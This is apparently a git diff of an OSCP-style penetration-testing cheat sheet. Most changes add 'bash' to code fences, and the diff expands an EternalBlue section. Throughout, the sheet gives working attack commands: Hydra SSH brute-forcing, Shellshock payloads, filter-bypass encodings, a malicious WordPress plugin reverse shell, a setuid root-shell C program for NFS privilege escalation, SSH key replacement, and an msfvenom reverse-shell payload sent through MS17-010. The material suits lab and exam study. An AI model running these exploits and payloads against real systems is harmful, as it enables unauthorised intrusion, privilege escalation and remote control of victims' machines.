@@ -14,7 +14,7 @@
 ## Initial Recon
 
 Network scans
-```
+```bash
 $ sudo nmap -v -A [target]  # TCP default ports, OS detection, version detection, script scanning, and traceroute.
 $ sudo nmap -v -p- [target] # TCP all ports.
 $ sudo nmap -v -sU [target] # UDP default ports.
@@ -25,7 +25,7 @@ $ sudo nmap -v -p- -T4 [target]                         # TCP all-ports aggressi
 ```
 
 Web scans - Gobuster/Nikto/Nmap
-```
+```bash
 $ nikto -host [target]
 $ sudo nmap -v -sV -p80,443 --script vuln [target]
 
@@ -44,7 +44,7 @@ Tips
 * Try `PUT` and `GET`.
 
 Anonymous login
-```
+```bash
 $ ftp [target]
 Name: anonymous
 Password
@@ -53,14 +53,14 @@ Password
 ### SSH [22 TCP]
 
 Hydra SSH brute-force
-```
+```bash
 $ hydra -L users.txt -P SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt [target] ssh -t 4
 ```
 
 ### SMTP [25 TCP]
 
 Nmap vuln scan
-```
+```bash
 $ sudo nmap -p25 --script smtp-vuln-* [target]
 ```
 
@@ -70,12 +70,12 @@ Mail server Shellshock RCE
 * See https://www.trendmicro.com/en_us/research/14/j/shellshock-related-attacks-continue-targets-smtp-servers.html
 
 Manual fingerprinting
-```
+```bash
 $ echo VRFY 'admin' | nc -nv -w 1 [target] 25
 ```
 
 SMTP user enumeration
-```
+```bash
 $ smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [target]
 ```
 
@@ -86,12 +86,12 @@ TFTP is a simple protocol for transferring files.
 Pentest UDP TFTP: https://book.hacktricks.xyz/pentesting/69-udp-tftp
 
 TFTP Nmap enum
-```
+```bash
 $ nmap -sU -p69 --script tftp-enum [target]
 ```
 
 TFTP commands
-```
+```bash
 $ tftp
 tftp> connect [target]
 tftp> put [/path/to/local.txt]
@@ -111,18 +111,18 @@ Tips
 * If you can't find anything from initial scans, recursively scan subdirs including those that you don't think contain anything e.g. `/icons`
 
 Nmap script vuln scan
-```
+```bash
 $ sudo nmap -v -sV -p80,443 --script vuln [target]
 ```
 
 Brute-Force Logins
-```
+```bash
 # generate wordlist from target website
 $ cewl http://target.com
 ```
 
 Filter / file extension bypass
-```
+```bash
 %0d%0a
 %00
 %en
@@ -133,7 +133,7 @@ Arbitrary file disclosure / LFI / RFI
 * Try all three if one works.
 
 PHP code exec i.e. `eval()`
-```
+```bash
 # Try different system command functions
 system()
 passthru()
@@ -153,7 +153,7 @@ SQL Injection
 * If time-based SQLi, you could also find a script to brute-force password one-char at-a-time.
 
 Apache Shellchock (/cgi-bin/*.cgi])
-```
+```bash
 # Test if vulnerable
 curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'VULNERABLE'" http://[target]/cgi-bin/[cgi_file]
 
@@ -169,7 +169,7 @@ IIS
 * IIS paths may be configured to be Case Sensitive. Take care when navigating / exploiting LFI/RFI or directory traversal.
 
 Wordpress wpscan
-```
+```bash
 # normal scan
 wpscan --url [target]/wordpress
 
@@ -178,7 +178,7 @@ wpscan --url [target]/wordpress -U admin -P [/path/to/wordlist]
 ```
 
 Wordpress reverse shell (https://github.com/wetw0rk/malicious-wordpress-plugin)
-```
+```bash
 # STEP 1: Create malicious plugin
 $ python wordpwn.py [LHOST] [LPORT] N
 $ unzip malicious.zip
@@ -234,14 +234,17 @@ rpcclient> getusrdompwinfo 0x3601
 ```
 
 Exploit NFS shares for privesc:
-```
+```bash
 $ showmount -e 192.168.xx.53
 Export list for 192.168.xx.53:
 /shared 192.168.xx.0/255.255.255.0
 $ mkdir /tmp/mymount
 /bin/mkdir: created directory '/tmp/mymount'
 $ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
-$ cat /root/Desktop/exploit.c
+```
+
+```c
+# generic C exploit
 #include <stdio.h>
 #include <unistd.h>
 int main(void)
@@ -251,13 +254,15 @@ setgid(0);
 system("/bin/bash");
 }
 gcc exploit.c -m32 -o exploit
+```
 
+```bash
 $ cp /root/Desktop/x /tmp/mymount/
 $ chmod u+s exploit
 ```
 
 Attack scenario: replace target SSH keys with your own
-```
+```bash
 $ mkdir -p /root/.ssh
 $ cd /root/.ssh/
 $ ssh-keygen -t rsa -b 4096
@@ -284,7 +289,7 @@ Check Samba service version.
 
 ### SMB (WINDOWS SMB) [139, 445 TCP]
 
-```
+```bash
 $ nmblookup -A [target]
 $ smbclient -L //[target]   // null session
 $ enum4linux [target]       // null session
@@ -292,17 +297,26 @@ $ nbtscan [target]
 ```
 
 Automated enum
-```
+```bash
 $ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
 ```
 
-Eternal Blue check
-```
-$ sudo --script smb-vuln-* [target]
+Eternal Blue (MS17-010)
+```bash
+# check for vuln
+# source: https://github.com/worawit/MS17-010/blob/master/checker.py
+$ eternalblue/checker.py [target]
+OR
+$ sudo nmap --script smb-vuln-* [target] # nmap
+
+# generse rshell payload -> exec exploit
+# source: https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
+$ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=666 EXITFUNC=thread -f exe -a x86 -o ms17-010.exe
+$ msf17-010-send-and-receive.py [target] ms17-010.exe
 ```
 
 Enumerate SMB
-```
+```bash
 $ smbclient --no-pass -L //10.11.1.31         # list shares
 $ smbclient --no-pass \\\\[target]\\[share]   # connect to a share
 
@@ -316,7 +330,7 @@ SNMP is an app-layer protocol for collecting and managing information about devi
 
 SNMP enumeration:
 (find further info about devices/software with vulns to gain a shell)
-```
+```bash
 $ snmpwalk -c [community string] -v1 [ target ]
 $ onesixtyone [ target ] -c community.txt
 $ snmpenum
